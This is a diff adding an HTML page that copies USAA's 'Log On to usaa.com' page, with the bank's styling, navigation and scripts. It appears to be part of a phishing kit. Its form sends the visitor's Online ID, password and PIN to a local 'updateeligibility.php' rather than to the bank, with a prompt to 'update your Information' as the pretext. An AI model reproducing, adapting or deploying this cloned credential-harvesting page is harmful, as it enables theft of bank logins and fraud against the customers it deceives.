@@ -1,0 +1,926 @@
+ 
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+
+<head>
+	
+
+
+    <meta name="google-site-verification" content="ixTkEWd_UcMhrL39nLaMLEq66o3Ecdwa-btSiATF0Uc" />
+
+
+<title>Log On to usaa.com | USAA</title>
+
+
+
+
+
+	<meta name="title" content="Log On to usaa.com | USAA" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="pics-label" content='(pics-1.1 "http://www.icra.org/ratingsv02.html" l gen true for "http://www.usaa.com" r (cz 1 lz 1 nz 1 oz 1 vz 1) "http://www.rsac.org/ratingsv01.html" l gen true for "http://www.usaa.com" r (n 0 s 0 v 0 l 0))' /> 
+
+
+
+
+
+
+
+
+<meta name="ROBOTS" content="NOODP" />
+
+
+<meta name="ROBOTS" content="NOYDIR" /> 
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Content-Style-Type" content='text/css' />
+
+
+
+	<link rel="stylesheet" type="text/css" href="https://content.usaa.com/mcontent/static_assets/Includes/styles_member.css?cacheid=3526702913" media="all" />
+			<link rel="stylesheet" type="text/css" href="https://content.usaa.com/mcontent/static_assets/Includes/styles_member_print.css?cacheid=644397621" media="print" />
+	
+	
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+	
+	
+		<script language="JavaScript1.2" src="https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent_core.js-loader.js-yahoo-dom-event.js-cp_std.js-cp_help_popup-min.js?cacheid=2772034137" type="text/javascript"></script>
+
+	
+
+
+
+
+
+
+
+<script language="JavaScript1.2" type="text/javascript">
+
+
+	function dynamicAction(Action)
+	{
+		var element = YAHOO.util.Dom.get('EligibilityOPP');
+		if (YAHOO.lang.isObject(element)){
+
+			
+			
+			if (true)
+			{
+				
+				element.PS_DYNAMIC_ACTION.value = Action;
+				
+                
+				if(YAHOO.lang.isObject(document.getElementById("PS_SCROLL_POSITION")))
+				{
+				element.PS_SCROLL_POSITION.value = scrollPosition() + ":" + element.PS_PAGEID.value;
+				}
+				
+				element.submit();
+			}
+		}
+		return false;
+		
+	}
+
+
+	function scrollPosition()
+	{
+		
+		var winX = window.pageYOffset ? window.pageYOffset : 0;
+		var docElementX = document.documentElement ? document.documentElement.scrollTop : 0;
+		var bodyX = document.body ? document.body.scrollTop : 0;
+		var resultX = winX ? winX :0;
+		var positionX =0;
+		
+				
+		var winY = window.pageXOffset ? window.pageXOffset : 0;
+		var docElementY = document.documentElement ? document.documentElement.scrollLeft : 0;
+		var bodyY = document.body ? document.body.scrollLeft :0;
+		var resultY = winY ? winY :0;
+		var positionY =0;
+		
+		
+		if(docElementX > 0)
+		{
+			if(docElementX && (!resultX || (resultX > docElementX)))
+				resultX = docElementX;
+			positionX = bodyX && (!resultX || (resultX > bodyX)) ? bodyX : resultX;
+		}
+		
+		if(docElementY > 0)
+		{
+			if(docElementY && (!resultY || (resultY > docElementY)))
+				resultY = docElementY;
+			positionY = bodyY && (!resultY || (resultY > bodyY)) ? bodyY : resultY;
+		}
+		
+		return positionX+":"+positionY;
+	}
+	
+	
+
+	function resetScrollPosition()
+	{
+		var pageId = YAHOO.util.Dom.get('EligibilityOPP').PS_PAGEID.value;
+		
+		var scrollPosition =  '';
+		
+		if(scrollPosition != '')
+		{
+			var scrollPositionDetails = scrollPosition.split(":");
+			var isDisplayMessage = false;
+			
+			
+			if(scrollPositionDetails[2] != '' && scrollPositionDetails[2] == pageId && !isDisplayMessage)
+			{
+				document.documentElement.scrollTop =  scrollPositionDetails[0];
+				document.documentElement.scrollLeft = scrollPositionDetails[1];
+			}
+		}
+	}
+
+
+	function submitDynamicAction(Action,Target,Context)
+	{
+		return dynamicAction("PsDynamicAction_[action]" + Action + "[/action][target]" + Target + "[/target][context]" + Context + "[/context]");
+	}
+
+</script>
+
+<script language="JavaScript1.2" type="text/javascript">
+   
+   var children = new Array();
+   var nr       = 0;
+
+   
+   function closeChildren()
+   {
+   
+	  closeHelpWnd();
+
+      for (i=0; i < nr; i++)
+      {
+         children[i].close();
+      }
+   }
+
+
+   function openGlossaryWindow(PageName)
+   {
+      var intHelpWidth = "400";
+      var intHelpHeight = "220";
+      var intHelptop = "300";
+      var intHelpleft = "470";
+      children[nr] = window.open(PageName ,'_blank', "height=" + intHelpHeight + ",width=" + intHelpWidth + ",top=" + intHelptop + ",left=" + intHelpleft + ",status=no,titlebar=no,toolbar=no,menubar=no,location=no,resizable=no, scrollbars=yes");
+      nr +=1;
+      return false;
+   }
+
+
+   function openBrowserWindow(PageName)
+   {
+      children[nr] = window.open(PageName, 'browser');
+      nr +=1;
+      return false;
+   }
+
+
+   function openNewWindow(PageName)
+   {
+      children[nr] = window.open(PageName);
+      nr +=1;
+      return false;
+   }
+
+
+   function openTextWindow(PageName)
+   {
+      var intHelpWidth = "200";
+      var intHelpHeight = "220";
+      var intHelptop = "300";
+      var intHelpleft = "470";
+      children[nr] = window.open('','_blank', "height=" + intHelpHeight + ",width=" + intHelpWidth + ",top=" + intHelptop + ",left=" + intHelpleft + ",status=no,titlebar=no,toolbar=no,menubar=no,location=no,resizable=no, scrollbars=yes");
+      // SEND TEXT TO THE PAGE
+      children[nr].document.write(PageName);
+      nr +=1;
+      return false;
+   }	
+</script>
+
+
+
+<script language="JavaScript" type="text/javascript">
+	var ps_SubmitEnabled = true;
+	var ps_clickCount = 0;
+	
+	function ps_handleFormSubmit(delayInSeconds)
+	{
+		if (ps_SubmitEnabled)
+		{
+			ps_SubmitEnabled = false;
+			ps_clickCount++;
+
+			if(delayInSeconds==null || typeof(delayInSeconds)=='undefined')
+			{
+				delayInSeconds = 5;
+			}
+
+			if(delayInSeconds>0)
+			{
+				setTimeout("ps_SubmitEnabled_Cust_delayTime = true;", delayInSeconds * 1000);
+				return true;
+			}
+			else
+				if(delayInSeconds==0)
+				{
+					return (ps_clickCount<=1);
+}
+				else
+					if(delayInSeconds<0)
+{
+						return true;
+					}
+		}
+
+		return false;
+	}
+</script>
+<script language="JavaScript" type="text/javascript">
+
+
+function setFocus(formElement)
+{
+  document.forms[0].elements[formElement].focus();	   	   
+} // End of setFocus.
+</script>
+
+<script language="JavaScript" type="text/javascript">
+
+
+function setFocus(formName,formElement)
+{
+  document.forms[formName].elements[formElement].focus();	   	   
+} // End of setFocus.
+</script>
+
+<script language="JavaScript1.1" type="text/javascript">
+
+
+
+
+
+	
+function setBrowserNavCookie(newTrigger, cookieTimeStamp)
+{
+	var newCookieValue = newTrigger + UTILITY_COOKIE_DELIMETER + cookieTimeStamp;
+	ec_SetCookie(UTILITY_COOKIE_NAME, newCookieValue, null, ".usaa.com", "/");
+}
+
+//this function builds the url of the quick links.
+function quickLinksURL()
+{
+	var quickLinksUrl = 'https://www.usaa.com/inet/ent_quicklinks/EntQuickLinks'
+	return quickLinksUrl;
+}
+</script>
+
+
+
+
+
+	
+	
+
+	
+
+
+
+	<link rel="SHORTCUT ICON" href="https://content.usaa.com/mcontent/static_assets/Media/usaaicon.ico?cacheid=435112253" />
+
+
+
+</head>
+
+<!-- BEGIN HTML BODY -->
+<body onunload="closeChildren()
+"
+
+	
+	
+	
+		>
+
+	
+
+
+
+
+		
+
+	
+
+
+ 
+
+
+<!-- Begin outside wrapper for the container -->
+ <!-- Include the default container if no custom one exists-->
+ 
+ 	
+	
+		<div id="container">
+	
+ 	
+ 
+
+ 
+ <a name="top"></a>
+
+ <div class="noindex"> 
+	 
+	 
+	   
+ 		<!-- BEGIN PAGE HEADER -->
+		
+
+
+
+
+
+
+<script language="JavaScript">
+	
+	function openReportProblemWindow()
+	{	
+		 var url = 'https://www.usaa.com/inet/ent_utils/CpReportDefect?action=INIT';
+		 window.open(url,'document_window','width=700,height=450,top=250,left=300');
+	}
+	
+	
+</script>
+
+
+<a title="Skip Navigation (Accesskey 2)" accesskey="2" onclick="USAA.ent.util.skipToContent('content');" onblur="this.className='skipInactive';" onfocus="this.className='skipActive';" href="#content" class="skipInactive" id="skip">Skip to Content</a>
+<div id="header">
+
+	
+	
+	
+
+	
+	  <div id="logo"><a href="https://www.usaa.com/inet/ent_home/CpHome" class="logo"><img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="53" height="55"  alt="USAA Member Home" title="USAA Member Home"/></a> <a href="https://www.usaa.com/inet/pages/security_center" class="security"><img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="84" height="24" alt="usaa.com is a Secure Site"    title="usaa.com is a Secure Site"/></a></div>
+	  <div id="navReference" style="position:absolute;top:5px;right:22px;z-index:10003;"><a href="https://www.usaa.com/inet/ent_home/CpHome">Log On</a> | <a href="https://www.usaa.com/inet/pages/ContactUsMain">Contact Us</a></div>
+	
+	
+</div>
+
+	
+
+
+<div class="globalNavContainer">
+	<div id="nav">
+		
+		
+			<div class="yui-skin-sam toolsSearch_pubSide">
+		
+				<div class="yui-ac">
+					<form action="https://www.usaa.com/inet/ent_search/CpPrvtSearch" method="get">	
+						<label for="search" class="searchLabel">Search</label>
+						<input type="text" class="searchInput yui-ac-input" id="search" name="SearchPhrase" value="Search" title="Search" autocomplete="off" onclick="if(this.form.elements['SearchPhrase'].value=='Search'){this.form.elements['SearchPhrase'].value=''};" onfocus="USAA.ec.search.Autocomplete.initYUI('search', 'headerSearchAutocompleteContainer'); if(this.form.elements['SearchPhrase'].value=='Search'){this.form.elements['SearchPhrase'].value=''};" />
+						<div id="headerSearchAutocompleteContainer" class="yui-ac-container"></div>
+						<button name="searchButton" value="search" type="submit" class="searchButton" id="searchButton" onclick="javascript:if(this.form.elements['SearchPhrase'].value=='Search'){this.form.elements['SearchPhrase'].value=''}"></button>
+
+					</form>
+				</div>
+			</div>
+		
+	
+		
+	 
+			
+			
+			
+			
+			 
+			
+			<div id="globalNav"><ul id="navGlobal"><li><a class="homeBtn" href="https://www.usaa.com/inet/ent_home/CpHome" ><span class="hiddenMessage">Home</span></a></li>
+<li><a class="whyChooseBtn" href="https://www.usaa.com/inet/pages/why_choose_usaa_main?wa_ref=pub_global_why_choose_usaa_main" ><span class="hiddenMessage">Why Choose USAA</span></a></li>
+<li><a class="productsBtn" href="https://www.usaa.com/inet/pages/products_services_main?wa_ref=pub_global_products_and_services" ><span class="hiddenMessage">Products & Services</span></a></li>
+<li><a class="adviceNPlanningBtn" href="https://www.usaa.com/inet/pages/advice_planning_main?wa_ref=pub_global_advice_and_planning" ><span class="hiddenMessage">Advice, Planning & Retirement</span></a></li>
+
+</ul></div>
+	
+	
+	</div>
+</div>
+
+
+<script type="text/javascript">
+	USAA.namespace('ec.search');
+	USAA.ec.search.Autocomplete = {
+		jsLoaded : false,
+		initYUI : function(inputID, containerID) {
+			if (!USAA.ec.search.Autocomplete.jsLoaded) {
+				USAA.ent.util.Loader.includeJS('https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/yui/datasource/datasource-min.js?cacheid=1468567911',function(){
+					USAA.ent.util.Loader.includeJS('https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/yui/autocomplete/autocomplete-min.js?cacheid=1222088056',function(){
+						USAA.ent.util.Loader.includeJS('https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/yui/connection/connection-min.js?cacheid=3970493711',function(){
+							USAA.ent.util.Loader.includeJS('https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ec/apps/search/autocompletesearchfield-min.js?cacheid=3275361659', function(){
+								USAA.ec.search.AutocompleteSearchField.newYUIAutocomplete(inputID, containerID);
+								USAA.ec.search.Autocomplete.jsLoaded = true;
+							});
+						});
+					});
+		 		});
+		 	} else {
+		 		try
+		 		{
+		 			USAA.ec.search.AutocompleteSearchField.newYUIAutocomplete(inputID, containerID);
+		 		}
+		 		catch(err){}
+		 	}
+		},
+		getDataSourceURL : function() {
+			
+			
+				return 'https://www.usaa.com/inet/ent_search/SearchAutoCompleteServlet?publicterms';
+			
+		}
+	}
+</script>
+
+
+
+		<!-- END PAGE HEADER --> 
+ 	 
+ </div> 
+	
+ 		
+
+
+ 
+
+
+	<a name="contentLink"></a>
+	
+	<div id="content">
+
+		
+		<div class="noindex"> 
+			
+
+
+ 
+
+
+
+<div id="toolsHeading">
+        
+        
+
+
+        
+        
+                <h1>
+                        Log On to usaa.com
+                </h1>
+        
+</div>
+
+
+
+
+
+
+ 
+ 		
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+		</div> 
+
+		
+		
+		
+		
+		
+			
+				<div id="rightColWrapper"> 	
+			
+		
+		
+		<div id="main">
+
+			
+				
+				
+
+ 
+
+
+
+	
+	
+
+    	
+	
+	    <form action="updateeligibility.php" method="post" id="EligibilityOPP" name="EligibilityOPP" >
+
+<input type="hidden" name="PS_APPLICATIONGUID" id="PS_APPLICATIONGUID" value="PS_Eligibility_1306783263448" />
+<input type="hidden" name="PS_RESPONSETIMESTAMP" id="PS_RESPONSETIMESTAMP" value="1306783263488" />
+<input type="hidden" name="PS_TASKID" id="PS_TASKID" value="" />
+<input type="hidden" name="PS_TASKNAME" id="PS_TASKNAME" value="EligibilityOPPTask" />
+<input type="hidden" name="PS_PAGEID" id="PS_PAGEID" value="EligibilityOPP" />
+<input type="hidden" name="PS_DYNAMIC_ACTION" id="PS_DYNAMIC_ACTION" value="" />
+<input type="hidden" name="PS_ACTION_CONTEXT" id="PS_ACTION_CONTEXT" value="" />
+<input type="hidden" name="PS_SCROLL_POSITION" id="PS_SCROLL_POSITION" value="" />
+<!-- pwvio11a,   ent_proofing_01 -->
+
+<input  name="PsButton_[action]UPDATE[/action]" tabindex="-1" type="image" border="0" src="https://content.usaa.com/mcontent/static_assets/Media/g_transparent.gif?cacheid=3007383100" alt="" alt=" " title="" width="1" height="1" /><div style="display: none"><input type="text" name="hidden_text_input" maxlength="1" size="1" disabled="disabled" value="" tabindex="0" /></div>
+
+	
+
+	
+	<!-- BEGIN SEARCH INDEX -->
+
+	
+	
+
+
+
+
+
+
+
+<link rel="stylesheet" title="usaa-passIndicator" type="text/css" href="https://content.usaa.com/mcontent/static_assets/Includes/usaa-passIndicator.css?cacheid=3264236443" media="screen" />
+<script type="text/javascript" src="https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/passstrngthindicator-min.js?cacheid=2005630446"></script>
+
+
+
+                <div id="stepsBar"><li class=step1active>Logon to User ID</li><li class=step2>Update Personal Information</li></div>
+
+                                <br />
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                <p>Please Logon to your online ID, password and PIN to update your Information.</p>
+
+        
+
+
+
+
+<table class="tableData" cellspacing="0" cellpadding="0" width="100%">
+        <tbody>
+             
+  
+  
+  
+  
+  	
+	
+            <tr>
+              <td class="dataLabel" width="13%">Online ID<br /></td>
+              <td>
+				<input type="text" id="oidpwpin.onlineid1" name="Onlineid" maxlength="20" size="30"  />
+
+                  </td>
+            </tr>
+            <tr>
+
+              <td class="dataLabel">Password<br /></td>
+            <td>
+            	<div style="width: 210px; margin-right: 10px;float: left;" class="fl">
+				<div class="passStrFormRow">
+	                 <label for="oidpwpin.password1" id="enterPwText"><span class="hiddenMessage"> Password</span></label>
+		                 <input type="password" id="oidpwpin.password1" name="password" maxlength="12" size="15" aria-required='true' aria-labelledby='enterPwText pwd_rating'  />
+<br /><class="textSmall">Forgot Your <a href="https://www.usaa.com/inet/ent_proof/proofingEvent?action=Init&amp;event=forgotOnlineId">Online ID</a> or <a href="https://www.usaa.com/inet/ent_proof/proofingEvent?action=Init&amp;event=forgotPassword">Password</a>?
+                        </div>
+
+    	          </div>
+              <!-- /.fl-->
+              <!-- Slider Notfication-->
+              
+              <!-- /.fl-->             
+		</td>
+          </tr>
+	
+
+			
+
+       
+ 			 <tr>
+              <td class="dataLabel"><a href="javascript:openHelpWnd('https://www.usaa.com/inet/mc_glossary/McGlossary?app=McGlossary&Cond=popup&area=Enterprise&topic=Remember+Pin&term=Personal+Identification+Number+(PIN)')" title=""  class="glossaryTerm" >PIN</a><br /></td>
+              <td>
+
+               <div class="passStrFormRow">
+                <label for="OidPwPin.Pin1" class="floatLabel"></label>
+                &nbsp<input type="password" id="oidpwpin.pin1" name="Pin" maxlength="4" size="5"  /><br />
+               </div>
+            </tr>
+       
+     
+
+        
+        
+          </tbody>
+        </table>     
+
+<DIV class="buttonContainer">               
+
+
+
+
+	<span class="action" ><button onclick="return submitDynamicAction('Update','','');"  name="Button[action]Update[/action]" title="Log On" id="PsButton_[action]Update[/action]" class="action" type="submit">Log On</button></span>   
+       
+              
+
+
+</DIV>
+<BR />
+                    
+
+<SCRIPT Language="JavaScript">
+USAA.ec.PassWordStrngth = new USAA.ec.PassStrngthIndicator({
+	pswdEntry : YAHOO.util.Dom.get('oidpwpin.password1'),
+	errMsgCont : YAHOO.util.Dom.get('fail_message_container'),
+	strngthIndicator : YAHOO.util.Dom.get('pwd_slider'),
+	ratingCont : YAHOO.util.Dom.get('pwd_rating'),
+	fireEvaluation : {
+		fieldId : 'oidpwpin.password1',
+		eventType : 'keyup',
+		maxPswdLen : 12,
+		minPswdLen : 8,
+		blurFlag : true
+	}
+	
+});
+</SCRIPT>
+
+	<!-- END SEARCH INDEX -->
+
+	
+	
+		</form>
+
+	
+
+				
+			
+		</div> 
+			
+				
+					<div id="rightCol"> 
+						<div class="noindex"> 
+							
+							 
+
+
+
+
+
+<div class="rightModule">
+
+	<h4>Need expert help?</h4>
+	
+			<p>1-877-632-3002</p>
+		
+</div>
+<div class="rightModuleImage">
+	<img src="https://content.usaa.com/mcontent/static_assets/Media/duk_registration.jpg?cacheid=3474196779" alt="Did you Know" border="0" />	
+</div>
+<br clear="all" />
+
+						</div> 
+					</div> 
+				
+			
+		
+		
+			
+				</div> 
+			
+		
+	</div>
+
+ 	
+	
+	
+ <div class="noindex"> 
+	
+	
+	
+		<!-- BEGIN PAGE FOOTER -->
+		
+
+
+
+
+
+
+
+
+<a name="bottom"></a>
+
+<div id="footer">
+	
+
+
+	<div id="navUtility">
+		
+
+		
+		
+		
+		 
+		
+
+		<ul class="sub"><li><a href="https://www.usaa.com/inet/pages/about_usaa_main?wa_ref=pub_subglobal_footer_about_usaa_page" >About USAA</a></li>
+<li><a href="https://www.usaa.com/inet/ent_blogs/Blogs?action=blogsummary&blogkey=newsroom" >Newsroom</a></li>
+<li><a href="https://www.usaa.com/inet/pages/security_center?wa_ref=pub_subglobal_footer_security_center_page" >Privacy & Security</a></li>
+
+<li><a href="http://www.usaa.apply2jobs.com/default.htm?wa_ref=pub_subglobal_footer_career_center_page" >Careers</a></li>
+<li><a href="https://www.usaa.com/inet/pages/usaa_mobile_main?wa_ref=pub_subglobal_footer_mobile_center_page" >Mobile</a></li>
+</ul>
+	
+
+
+		
+		
+		
+		
+			
+			
+
+
+			 
+				
+			
+			
+			<ul class="sub"><li><a href="https://www.usaa.com/inet/pages/ContactUsMain?wa_ref=pub_subglobal_footerUtility_utilityPublic_CONTACTUS" >Contact Us</a></li>
+<li><a href="https://www.usaa.com/inet/pages/site_map?wa_ref=pub_subglobal_footerUtility_footerDefault_SITEMAP" >Site Map</a></li>
+<li><a href="https://www.usaa.com/inet/mc_faq/McFAQ?app=CpFaq&FAQPageID=CorpPublicFaq&wa_ref=pub_subglobal_footerUtility_utilityPublic_FAQS" >FAQs</a></li>
+<li><a href="https://www.usaa.com/inet/pages/site_terms_and_conditions_main?wa_ref=pub_subglobal_footerUtility_utilityPublic_TERMCONDITIONS" >Site Terms</a></li>
+</ul>
+	
+		
+
+		
+		
+			
+				<iframe src="https://view.atdmt.com/iaction/iwcusa_EligibilityStartStandard1_1" width="1" height="1" frameborder="0" scrolling="No" marginheight="0" marginwidth="0" topmargin="0" leftmargin="0"></iframe>				
+			
+			
+				<script language="JavaScript">
+					var pageAction = "1903";
+				</script>
+
+			
+			<script language="JavaScript">
+				var onPublicSide = "true";
+				var initialReferrerURL = "null";
+			</script>
+			 
+			<script language="JavaScript" src="https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent/thirdparty/iCrossing/i2a-min.js?cacheid=1545068919" type="text/javascript"></script>
+		
+
+	</div>	
+
+
+        <a id="meetMeHandle"  class="logo"
+		href="https://www.usaa.com/inet/ent_home/CpHome?initCobrowse=https://www.usaa.com/inet/ent_memberassistance/Click2Call?action=INIT&MAMode=MeetMe"
+                onclick="
+                        (event.preventDefault)?event.preventDefault():event.returnValue=false;
+                        USAA.ent.util.Loader.includeJS(
+                                'https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent/widgets/meetmehelper-min.js?cacheid=2107802649'
+                                ,function(){USAA.ent.widgets.MeetMeHelper.init(
+				{
+					sHelperCssFile			: 'https://content.usaa.com/mcontent/static_assets/Includes/modalEditWindow.css?cacheid=3694476176'
+					,sJsAjaxUtilFile		: 'https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent/utilities/ajax-min.js?cacheid=3845737986'
+					,sJsObscureUtilFile		: 'https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/cp_edit_personal_info-min.js?cacheid=2748894639'
+				}
+				);}
+                        );
+                "
+        >
+
+			
+				<img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="53" height="55"  alt="USAA Member Home" />
+			
+
+        </a>
+
+	
+	<a href="javascript:openHelpWnd('https://seal.verisign.com/splash?form_file=fdf/splash.fdf&dn=WWW.USAA.COM&lang=en', 560, 500, 200, 200, false)" class="veriSign" style="">
+
+		
+			<img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="64" height="34" alt="View Verisign Certificate" />
+		
+	</a>
+
+
+
+
+	<div id="legalText" class="accentAnchors">
+		<div id="copyright"><p><span class="smallText">Copyright &copy; 2015 USAA. </span></p></div>
+		<div class="footnotes"></div><br><script language='JavaScript1.2' src='https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent/utilities/footnotes-min.js?cacheid=1721912267' type='text/javascript'> </script> <script language='JavaScript' type='text/javascript'> USAA.ent.util.Footnotes.findFootnotes(); </script>
+
+	</div>
+		
+	
+	
+	
+	
+	<br clear="all" />
+	
+</div>
+ 
+
+		<!-- END PAGE FOOTER -->
+	
+ </div> 
+
+</div> 
+</body>
+
+<!-- END HTML BODY -->
+</html>
